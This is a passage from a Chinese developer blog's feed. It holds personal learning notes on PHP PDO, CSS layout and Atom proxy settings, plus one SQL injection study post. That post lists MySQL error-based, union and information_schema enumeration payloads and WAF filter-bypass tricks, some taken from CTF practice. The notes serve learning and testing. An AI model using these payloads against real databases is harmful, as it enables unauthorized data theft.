<h2 id="最后的pdo"><a href="#最后的pdo" class="headerlink" title="最后的pdo"></a>最后的pdo</h2><p>加了一个抽象层，把应用层和数据库之间加了一层pdo</p>
]]></content>
      
        
        <tags>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[xss从入门到入门1]]></title>
      <url>/2017/07/15/xss%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A81/</url>
      <content type="html"></content>
      
        
        <tags>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sql注入从入门到入门]]></title>
      <url>/2017/07/15/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>一直不会SQL注入，感觉师傅注的好熟练<br>今天学习一下(这是挖了个坑)</p>
<h2 id="常见分类"><a href="#常见分类" class="headerlink" title="常见分类"></a>常见分类</h2><p>按照SQLMAP的分类</p>
<h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><h3 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h3><ul>
<li>updatexml()<br>是利用了<code>xpath syntax error</code><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from book where type_id = 14 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'</div></pre></td></tr></table></figure>
</li>
</ul>
<p>其中这里的<code>~</code>就是<code>0x7e</code>,大概是为了显示更清楚吧</p>
<ul>
<li>extractvalue()<br>报错原理同<code>updatexml</code>,所以用法也差不多<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> book <span class="keyword">where</span> type_id = <span class="number">14</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</div></pre></td></tr></table></figure>
</li>
</ul>
<p>区别在于<code>extractvalue</code>的调用方法是<code>extractvalue(arg1, arg2)</code>,其中<code>xpath</code>在<code>arg2</code>的位置上<br>而<code>updatexml</code>是<code>updatexml(arg1, arg2, arg3)</code>,其中<code>xpath</code>在<code>arg2</code>的位置上</p>
<ul>
<li>floor()<br>感觉这个floor还是比前面两个复杂，先上一段payload,算了还是先上几个学习资源吧<br><a href="http://www.cnblogs.com/xishaonian/p/6227405.html" target="_blank" rel="external">http://www.cnblogs.com/xishaonian/p/6227405.html</a><br><a href="https://www.zhihu.com/question/21031129" target="_blank" rel="external">https://www.zhihu.com/question/21031129</a><br>报错需要具备<code>count(*),rand(),group by</code></li>
</ul>
<h3 id="基于union的注入"><a href="#基于union的注入" class="headerlink" title="基于union的注入"></a>基于union的注入</h3><p>这个就比较常见啦<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> n1,n2,n3 <span class="keyword">from</span> xxx <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>, <span class="keyword">user</span>(), <span class="literal">null</span></div></pre></td></tr></table></figure></p>
<p>只不过有的时候会有限制显示结果只显示一行,这个时候要控制原来查询不返回结果,比如使用<code>id = -10086 union xxx</code><br>需要注意的地方是，类型要匹配，字段数量要匹配<br>字段类型匹配的问题，可以使用各种相容的<code>null</code>来实现<br>字段数量的话，可以用<code>order by field-n</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> n1,n2,n3 <span class="keyword">from</span> xxx <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> n</div></pre></td></tr></table></figure></p>
<p>这个n是按照第n个字段排序，大于查询字段数量的时候会报错</p>
<h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><p>就是拿分号隔开，写多个sql语句，但默认的话<br>php+mysql不支持堆叠查询<br>具体支持情况看下面这个链接阔以<br><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#StackingQueries" target="_blank" rel="external">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#StackingQueries</a><br>据说好像是php用pdo方式的话好像阔以支持堆叠查询<br>不过很少用过</p>
<h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><p>这样子是一下子爆一个,通过控制<code>limit n, 1</code>里面的<code>n</code>来显示第几条<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>;</div></pre></td></tr></table></figure></p>
<p>下面这个的话,用了<code>group_concat</code>，就可以一下子都搞出来<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>();</div></pre></td></tr></table></figure></p>
<h3 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'your_table_name'</span>;</div></pre></td></tr></table></figure>
<p>更换这个<code>table_name=&#39;your_table_name&#39;</code>就可以了,要是过滤掉单引号，可以使用十六进制<code>table_name=0x???</code></p>
<h2 id="bypass-WAF"><a href="#bypass-WAF" class="headerlink" title="bypass WAF"></a>bypass WAF</h2><p>挖坑，然后填，一点一点积累</p>
<h3 id="条件注释"><a href="#条件注释" class="headerlink" title="条件注释"></a>条件注释</h3><p>这个条件注释好像只有mysql可用<br><code>/!.../</code>类型注释有两种的<code>/!select/</code>和<code>/!50000select/</code><br>加了版本号的是高于这个版本执行</p>
<h3 id="select-from"><a href="#select-from" class="headerlink" title="select from"></a>select from</h3><p>过滤点常常在于<br>过滤掉了<code>select from</code>这样子的组合,<code>union select</code>也是一样的<br>例如<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">field</span>,<span class="number">1e0</span><span class="keyword">from</span> <span class="keyword">tables</span>;</div><div class="line"><span class="keyword">select</span> <span class="keyword">field</span> <span class="comment">/*!50000from*/</span> <span class="keyword">tables</span>;</div></pre></td></tr></table></figure></p>
<p>其实就是让select from看起来是一个selectxxxfrom</p>
<h3 id="代替空格"><a href="#代替空格" class="headerlink" title="代替空格"></a>代替空格</h3><h4 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h4><p><code>%09</code>,<code>%0a</code>,<code>%0b</code>,<code>%0c</code>,<code>%0d</code>,<code>%a0</code></p>
<h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p><code>/**/</code>,<code>/*!*/</code>,<code>/*!50000*/</code></p>
<h4 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h4><p><code>1.0</code>,<code>1e0</code></p>
<h4 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h4><p><code>id=\Nunion</code> 这个<code>\N</code>是<code>NULL</code><br>所以自然也可以放到select这里咯<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span>\Nfrom(book);</div></pre></td></tr></table></figure></p>
<h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><p>就是对数字进行运算的<code>+</code>,<code>-</code>,<code>~</code>,<code>!</code><br>因为不能使用<code>select1e0from</code>这样子的，虽然<code>1e0from</code>这里没有问题<br>但<code>select1e0</code>这里还是过不去,所以要运算符隔开<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span>~<span class="number">1e0</span><span class="keyword">from</span>(book);</div></pre></td></tr></table></figure></p>
<h4 id=""><a href="#" class="headerlink" title="@"></a>@</h4><p>这个原理也不太懂好像是mysq的变量<br>只用@的话,后面没办法去掉空格<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span>@aa <span class="keyword">from</span> book;</div></pre></td></tr></table></figure></p>
<p>所以配合<code>\</code>``<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span>@<span class="string">`type_id`</span><span class="keyword">from</span>(book);</div></pre></td></tr></table></figure></p>
<p>但发现,这里的<code>type_id</code>即使是存在的字段，这里也是只会查到<code>NULL</code>,<br>那这种加上@`` 的使用其实是没啥用??直接用@bypass掉前面的空格不就行了<br>好像是还有一种<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span>@^<span class="number">1e0</span><span class="keyword">from</span>(book)</div></pre></td></tr></table></figure></p>
<p>这里是由于可以引入数字所以可以bypass掉后面的空格而不报错,当然也可以<code>@^1</code>,但不能搞掉后面的空格<br>卧槽，我大概疯了，这样子没法用啊，我这后面的内容都只是说这样子写不报错，但有的不能注</p>
<blockquote>
<p>下面三个都只能用来括住字段名,表名</p>
</blockquote>
<h4 id="括号"><a href="#括号" class="headerlink" title="括号 ()"></a>括号 ()</h4><p>这个圆括号好像只能扩住字段<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span>(book);</div></pre></td></tr></table></figure></p>
<h4 id="括号-1"><a href="#括号-1" class="headerlink" title="括号 {}"></a>括号 {}</h4><p>这个没懂是什么鬼,这里的a换成<code>a-z</code>好像都可以<br>但好像只能用在字段名这里<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span>&#123;a book&#125;<span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span>;</div></pre></td></tr></table></figure></p>
<h4 id="-1"><a href="#-1" class="headerlink" title="``"></a>``</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span><span class="string">`book`</span><span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span>;</div></pre></td></tr></table></figure>
<p>所以他们可以使用的三个点<br><code>{a someting}</code>来举例<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span>&#123;x <span class="keyword">id</span>&#125;<span class="keyword">from</span>&#123;x book&#125;<span class="keyword">where</span>&#123;x <span class="keyword">id</span>&#125;=<span class="number">1</span>;</div></pre></td></tr></table></figure></p>
<h3 id="半个中文字符bypass注释"><a href="#半个中文字符bypass注释" class="headerlink" title="半个中文字符bypass注释"></a>半个中文字符bypass注释</h3><p><code>/**/</code>被过滤掉的时候<code>/*e4*/</code>这样子中文字符开始的</p>
<h3 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h3><p><code>\</code>version`()`这样子也可以用</p>
<h3 id="过滤掉单引号"><a href="#过滤掉单引号" class="headerlink" title="过滤掉单引号"></a>过滤掉单引号</h3><p>用十六进制来bypass</p>
<h3 id="逗号没了"><a href="#逗号没了" class="headerlink" title="逗号没了"></a>逗号没了</h3><ul>
<li><p>limit </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">limit 0,1 =&gt; limit 1 offset 1</div></pre></td></tr></table></figure>
</li>
<li><p>mid/substr </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mid(database(), 0, 1) =&gt; mid(database() from 1 for 1)</div></pre></td></tr></table></figure>
</li>
<li><p>union</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">union <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b jon (<span class="keyword">select</span> <span class="number">3</span>)c</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这个union处逗号过滤好像是上次DDCTF里用到了这个</p>
<h3 id="这个不知道怎么叫"><a href="#这个不知道怎么叫" class="headerlink" title="这个不知道怎么叫"></a>这个不知道怎么叫</h3><p>很多地方都有类似的思想<br>比如<code>select</code>被替换为空,这个时候就可以<code>SELselectECT</code><br><code>*</code>被替换为空,这个时候不能<code>/**/</code>,不能<code>select *</code>是比较惨,但可以<code>un*ion select</code><br>(也不一定绝对可以,看具体逻辑)</p>
<h3 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h3><p>好像只是见于IIS,因为IIS解析unicode的缘故????<br>这里有个<a href="https://www.secpulse.com/archives/36810.html" target="_blank" rel="external">例子</a></p>
<h3 id="连等"><a href="#连等" class="headerlink" title="连等"></a>连等</h3><p>以前有个连等的例子忘记了，是啥<br><code>where xxx=&#39;1&#39;=&#39;0&#39;</code><br>等想起来补充吧</p>
<h3 id="过滤了字段名"><a href="#过滤了字段名" class="headerlink" title="过滤了字段名"></a>过滤了字段名</h3><p>DDCTF里遇到过滤了news表里的关键字段<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> i<span class="number">.4</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> news)i</div></pre></td></tr></table></figure></p>
<p>通过一个由join构建的临时表来union我们的news表，得到一个新的临时表i,这样子就能通过临时表i的字段来select出我们要的news表的数据<br>这里得到的新的表的字段就是<code>1</code>,<code>2</code>,<code>3</code>,<code>4</code></p>
<p>由于这个题目还过滤了逗号，所以实际上题目这一部分，还要过逗号，用上面的方法就是<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> i<span class="number">.4</span> <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)e <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)f <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)g <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">4</span>)h <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> news)i</div></pre></td></tr></table></figure></p>
<p>就是通过<code>select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d</code>来替换<code>select 1,2,3,4</code></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.secpulse.com/archives/4213.html" target="_blank" rel="external">https://www.secpulse.com/archives/4213.html</a> (sqlmap使用说明)<br><a href="http://www.cnblogs.com/REscan/p/7043705.html" target="_blank" rel="external">http://www.cnblogs.com/REscan/p/7043705.html</a> (偶然看到的，还没看)<br><a href="http://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html" target="_blank" rel="external">http://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html</a> (还没看)<br><a href="https://www.secpulse.com/archives/50067.html" target="_blank" rel="external">https://www.secpulse.com/archives/50067.html</a><br><a href="http://rainism-ashes.lofter.com/post/1d19feeb_887d7b6" target="_blank" rel="external">http://rainism-ashes.lofter.com/post/1d19feeb_887d7b6</a> (这个大佬blog疑似大量干货)</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[css从入门到入门2]]></title>
      <url>/2017/07/14/css%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A82/</url>
      <content type="html"><![CDATA[<h2 id="margin"><a href="#margin" class="headerlink" title="margin"></a>margin</h2><h3 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h3><p>这个在该元素设置了<code>width</code>或者<code>max-width</code>的前提下<br>之后再设置<code>margin:0 auto</code><br>可以实现水平居中的布局</p>
<p>不要和<code>float</code>混在一起,float之后应该是不能这样子居中的吧<br>因为<code>float</code>之后脱离文档流了咩</p>
<h4 id="和-text-align-center-相比"><a href="#和-text-align-center-相比" class="headerlink" title="和 text-align:center 相比"></a>和 text-align:center 相比</h4><p>这样子的话，对于一些内联元素(没办法设置<code>margin</code>)的可以采用<br>给内联元素的父元素设置<code>text-align:center</code>的方式</p>
<p>比如<code>img</code>的居中，或者把他转换成<code>block</code>，然后使用<code>margin: 0 auto</code><br>或者给<code>img</code>的父元素设置<code>text-align:center</code></p>
<h3 id="两栏布局"><a href="#两栏布局" class="headerlink" title="两栏布局"></a>两栏布局</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">|------------|----|</div><div class="line">|---main-----|side|</div><div class="line">|------------|----|</div></pre></td></tr></table></figure>
<p>就是这样子的，整个由一个container构成，包裹着<code>main</code>和<code>side</code>,而<code>main</code>的话是设置<code>margin-right</code>为略大于<code>side</code>的<code>width</code>来控制自己不跑到<code>side</code>那边去<br>看到有些人是这样子做的，那为什么不直接给<code>main</code>一个<code>width</code>呢</p>
<h2 id="position"><a href="#position" class="headerlink" title="position"></a>position</h2><h3 id="absolute"><a href="#absolute" class="headerlink" title="absolute"></a>absolute</h3><p><code>position:absolute</code>会让元素<code>inline-block</code>化,然后是常常相对于一个不偏移的<code>position:relative</code>的父元素来偏移，这样子的话，可以很容易做一个透明层上去，或者各种浮层，比如鼠标移动上去就会显示的那种浮层，其实一直想知道<code>position:absolute</code>这种很危险的属性到底是为了实现什么效果的时候才不得不用???是这种浮层效果嘛<br>或者是一些框框上面的的关闭按钮之类的，额，也其实还是浮动层，那么问题来了，还有其他很常见的应用场景吗</p>
<h2 id="background"><a href="#background" class="headerlink" title="background"></a>background</h2><h3 id="backgroud-position"><a href="#backgroud-position" class="headerlink" title="backgroud-position"></a>backgroud-position</h3><p>传说中的切图，就是一张图上有好多东西，不需要把这样子一张大图切成小图，把图片设置成元素的背景，这个时候只需要控制图片在显示的部分，因为图比较大，所以只是露出来一部分，记得设置元素的宽和高正好等于你需要的显示出来的图片的大小，这这样子才能正好的遮盖<br>具体参考<a href="http://www.cnblogs.com/zgqys1980/p/4308434.html" target="_blank" rel="external">这里</a></p>
<h2 id="字体图标"><a href="#字体图标" class="headerlink" title="字体图标"></a>字体图标</h2><p>为什么字体图标经常用<span>标签</span></p>
]]></content>
      
        
        <tags>
            
            <tag> css </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[atom安装包]]></title>
      <url>/2017/07/13/atom%E5%AE%89%E8%A3%85%E5%8C%85/</url>
      <content type="html"><![CDATA[<p>编辑<code>~/.atom/.apmrc</code></p>
<p>添加<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">strict-ssl=<span class="literal">false</span></div><div class="line">https-proxy=http://127.0.0.1:1080/</div><div class="line">http-proxy=http://127.0.0.1:1080/</div></pre></td></tr></table></figure></p>
<p>网上还有说设置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">registry=https://registry.npm.taobao.org/</div></pre></td></tr></table></figure></p>
<p>其实只是这样子是不行的，因为atom安装包还要访问atom官网，而不只是npm的问题</p>
]]></content>
      
        
        <tags>
            
            <tag> atom </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[导航栏制作]]></title>
      <url>/2017/07/13/%E5%AF%BC%E8%88%AA%E6%A0%8F%E5%88%B6%E4%BD%9C/</url>
      <content type="html"><![CDATA[<p>原先制作导航栏只是pc端，直接用的是<code>fixed</code>,但好像现在才发现，要适应手机的话，会有bug，在网上果然，以及有这个问题解决方法了</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://efe.baidu.com/blog/mobile-fixed-layout/" target="_blank" rel="external">http://efe.baidu.com/blog/mobile-fixed-layout/</a><br><a href="http://www.w3cplus.com/css/sticky-headers.html" target="_blank" rel="external">http://www.w3cplus.com/css/sticky-headers.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[css从入门到放弃]]></title>
      <url>/2017/07/13/css%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/</url>
      <content type="html"><![CDATA[<h2 id="替换元素-非替代元素"><a href="#替换元素-非替代元素" class="headerlink" title="替换元素 非替代元素"></a>替换元素 非替代元素</h2><h3 id="替换元素"><a href="#替换元素" class="headerlink" title="替换元素"></a>替换元素</h3><p>浏览器根据元素的标签和属性来决定具体显示的内容<br>而这些元素本身没有什么内容，比如，<br>img、input、textarea、select、object都是替换元素</p>
<h3 id="非替换元素"><a href="#非替换元素" class="headerlink" title="非替换元素"></a>非替换元素</h3><h2 id="块级元素-行内元素"><a href="#块级元素-行内元素" class="headerlink" title="块级元素 行内元素"></a>块级元素 行内元素</h2><p>元素宽度在不设置的情况下，是它本身父容器的100%<br>块级元素独占一行<br>块级元素的<code>height</code>,<code>width</code>,<code>padding</code>,<code>border</code>和<code>margin</code>都可以设置的</p>
<ol>
<li>好像只要设置了浮动的元素自动转换成了块级</li>
<li>设置了<code>position:absolute</code>，与<code>position:fixed</code>也会转换成块级</li>
<li>直接用<code>display:block</code></li>
</ol>
<h3 id="典型的块级元素"><a href="#典型的块级元素" class="headerlink" title="典型的块级元素"></a>典型的块级元素</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>、<span class="tag">&lt;<span class="name">p</span>&gt;</span>、<span class="tag">&lt;<span class="name">h1</span>&gt;</span>到<span class="tag">&lt;<span class="name">h6</span>&gt;</span> <span class="tag">&lt;<span class="name">ul</span>&gt;</span> <span class="tag">&lt;<span class="name">pre</span>&gt;</span> <span class="tag">&lt;<span class="name">li</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="典型的行内元素"><a href="#典型的行内元素" class="headerlink" title="典型的行内元素"></a>典型的行内元素</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>、<span class="tag">&lt;<span class="name">span</span>&gt;</span>、<span class="tag">&lt;<span class="name">strong</span>&gt;</span> (非替换)</div><div class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span>&gt;</span> (替换)</div></pre></td></tr></table></figure>
<p>本来以为行内元素都不能设置长宽，后来无意看到<a href="http://www.jianshu.com/p/274614a078f3" target="_blank" rel="external">这个</a>,下面摘自这个文章</p>
<blockquote>
<p>行内元素也就分为行内替换元素img input,与行内非替换元素span a…对于二者css修饰起来是有差别的。</p>
</blockquote>
<ul>
<li>行内非替换元素：其宽高设置无效， 对于内外边距，边框，可以设置，但是垂直方向的设置并不会影响文档流布局，所以设置垂直内外边距是没有效果的，垂直边框，我们是看得见，但是垂直边框并不占据文档流 。所以上面的行内元素设置了宽度为10px的边框，并不会导致下面元素的向下移动。</li>
<li>行内替换元素，除了具备行内元素同行并列的特点，他可以设置影响文档流布局的内外边距以及宽高。 且设置高度等同于设置行高，会垂直居中</li>
<li>line-height 行内非替换元素虽然不具备宽高，但是可以利用line-height来设置高度，但是奇葩的是，虽然行高可以影响行内元素的文档流布局，但是，其边框依旧会包裹其内容，忽略行高带来的上下留白。</li>
<li>margin 行内元素的边距，不会合并（替换非替换）。不同于块级元素，会合并上下，左右边距。</li>
</ul>
<p>怎么个差别呢(这，，不是很明显嘛)</p>
<h2 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h2><h3 id="为什么要使用浮动"><a href="#为什么要使用浮动" class="headerlink" title="为什么要使用浮动"></a>为什么要使用浮动</h3><p>我理解的通常意义上我们使用<code>float</code>就是，让一行显示多个div这样子的<code>块级元素</code><br>为了显示那种方块列表的效果</p>
<blockquote>
<p>All elements have a default display and most of the time that default is exactly what you want. In fact when you choose to use a div, it’s mainly because of it’s default display value of block.</p>
</blockquote>
<p>那为什么我们不使用<code>行内元素</code>呢，而不使用<code>块状元素</code>来达到这个效果呢，因为<code>块状元素</code>有<code>height</code>,<code>width</code>,<code>padding</code>,<code>border</code>和<code>margin</code></p>
<blockquote>
<p>Block level elements are laid out according to the box model, where each block has a width and height, as well as vertical and horizontal padding, border, and margin. </p>
</blockquote>
<p>但是</p>
<blockquote>
<p>Blocks are displayed vertically one after the other, with the distance between them depending on the margins set.<br>就是说虽然能实现是一个个我们需要的块，但他会独占一行(display vertically)，所以不能实现我们一行几个块，一行几个块，比如实现5*2的一个商品展示区的效果</p>
</blockquote>
<p>而我们的<code>行内元素</code>，虽然可以实现，一个接一个，即不独占一行，大家可以挤一挤(display horizontally)，但，他不像<code>块级元素</code>,能设置<code>height</code>,<code>width</code>,<code>padding</code>,<code>border</code>和<code>margin</code></p>
<blockquote>
<p>Inline elements are displayed horizontally and don’t follow the box model. Horizontally their padding and margin is respected, but not so vertically. The heights of inline boxes are set according to the rules of line-height calculations. For the most part that will mean the height of the containing block.</p>
</blockquote>
<p>这个时候就是有一个<code>inline-block</code>,他就能<code>display horizontally</code>(就是横着排一排)，还能设置<code>宽高边距</code>之类的</p>
<p>我们说的是浮动啊，浮动<br>我们<code>float</code>的是<code>block</code>元素<br>这个浮动是脱离了文档流，所以飘在自己原来所处的位置(这里是说竖直方向)的正上方(z轴正上方的样子),<br>这样子的话，原来在自己下面(竖直方向)的元素会浮动上来，就是无视float了的元素(脱离了标准流)<br>所以这个时候其实自己可能盖住原来竖直方向在自己下面的元素或者盖住部分，毕竟自己是飘着的嘛<br>而水平方向可以通过float的值是<code>left</code>还是<code>right</code>，来飘到这一行的左边还是右边</p>
<p>这里注意，当浮动元素上面的元素是文档流里的元素时候，元素float之后不会改变自己的竖直位置<br>但当自己前面一个元素也是float时候，也会跟上去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[block1]</div><div class="line">[block2 float:left]</div></pre></td></tr></table></figure></p>
<p>对，大概就是这个意思吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[block1 float:left] [block2 float:left]</div></pre></td></tr></table></figure></p>
<h3 id="浮动的副作用"><a href="#浮动的副作用" class="headerlink" title="浮动的副作用"></a>浮动的副作用</h3><p>在网上看到了浮动的副作用</p>
<ol>
<li>背景不能显示<br>由于浮动产生，如果对父级设置了（CSS background背景）CSS背景颜色或CSS背景图片，而父级不能被撑开，所以导致CSS背景不能显示。</li>
<li>边框不能撑开<br>如果父级设置了CSS边框属性（css border），由于子级里使用了float属性，产生浮动，父级不能被撑开，导致边框不能随内容而被撑开。</li>
<li>margin padding设置值不能正确显示<br>由于浮动导致父级子级之间设置了css padding、css margin属性的值不能正确表达。特别是上下边的padding和margin不能正确显示。</li>
<li>有高度塌陷的问题，这个时候要清除浮动</li>
</ol>
<h2 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h2><p>为什么要清除浮动</p>
<ol>
<li>上面说到两个float的元素，还是会跟着在一起，这时候想要block2到block1下一行的话，就要给block2一个<code>clear:left</code>,意思是清除block2左边的浮动元素，因为是block2左边不能有东西在浮动所以block2就自己下来一行了,这个应该是解决高度塌陷的问题吧,把由于高度不一造成的不该上来的元素再挤下去</li>
<li>是为了把父元素重新撑起来??</li>
</ol>
<p>是这样子的两个作用吗</p>
<p>在word里就有浮动，是为了文字环绕图片的效果，那么浮动是会影响文本内容的咯</p>
